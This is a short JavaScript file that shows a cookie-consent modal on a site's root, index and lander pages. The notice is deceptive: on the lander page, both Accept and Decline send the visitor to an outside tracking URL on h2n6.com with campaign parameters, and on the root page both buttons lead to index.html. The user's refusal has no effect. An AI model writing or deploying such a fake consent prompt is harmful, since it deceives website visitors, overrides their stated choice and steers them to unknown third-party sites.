(function() {
  const path = window.location.pathname;
  const isRoot = (path === "/");
  const isIndex = /index\.html$/.test(path);
  const isLander = /lander\.html$/.test(path);
  // Show modal on root, index.html, or lander.html
  if (!isRoot && !isIndex && !isLander) return;
  // Create Modal
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
  <div class="modal">
    <h3>Cookie & Policy Notice</h3>
    <p>We use cookies to improve gameplay and user experience.  
    Do you accept our policy to continue?</p>
    <div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center">
      <button class="btn" id="modal-yes">Accept</button>
      <button class="btn ghost" id="modal-no">Decline</button>
    </div>
  </div>`;
  // Add mobile-specific styles
  const style = document.createElement('style');
  style.textContent = `
    @media (max-width: 768px) {
      .modal-backdrop {
        align-items: flex-end !important;
      }
      
      .modal {
        padding: 16px !important;
        margin: 0 12px 20px 12px !important;
        max-width: calc(100% - 24px) !important;
      }
      
      .modal h3 {
        font-size: 18px !important;
        margin-bottom: 10px !important;
        margin-top: 0 !important;
      }
      
      .modal p {
        font-size: 14px !important;
        margin-bottom: 12px !important;
        line-height: 1.4 !important;
      }
      
      .modal .btn {
        padding: 10px 16px !important;
        font-size: 14px !important;
        min-width: 100px !important;
      }
      
      .modal > div {
        gap: 8px !important;
      }
    }
    
    @media (max-width: 480px) {
      .modal-backdrop {
        align-items: flex-end !important;
      }
      
      .modal {
        padding: 12px !important;
        margin: 0 10px 16px 10px !important;
      }
      
      .modal h3 {
        font-size: 16px !important;
        margin-bottom: 8px !important;
      }
      
      .modal p {
        font-size: 13px !important;
        margin-bottom: 10px !important;
      }
      
      .modal .btn {
        padding: 8px 14px !important;
        font-size: 13px !important;
        flex: 1 1 auto !important;
      }
      
      .modal > div {
        gap: 6px !important;
      }
    }
  `;
  document.head.appendChild(style);
  document.body.appendChild(bd);
  bd.style.display = 'flex';
  const yes = bd.querySelector('#modal-yes');
  const no = bd.querySelector('#modal-no');
  yes.addEventListener('click', handleClick);
  no.addEventListener('click', handleClick);
  function handleClick() {
    if (isRoot) {
      window.location.href = "index.html";
      return;
    }
    if (isLander) {
      window.location.href =
        "https://h2n6.com/?utm_campaign=HPcGdok7FL&v1=[v1]&v2=[v2]&v3=[v3]";
      return;
    }
    // Close modal for other pages
    bd.remove();
  }
})();
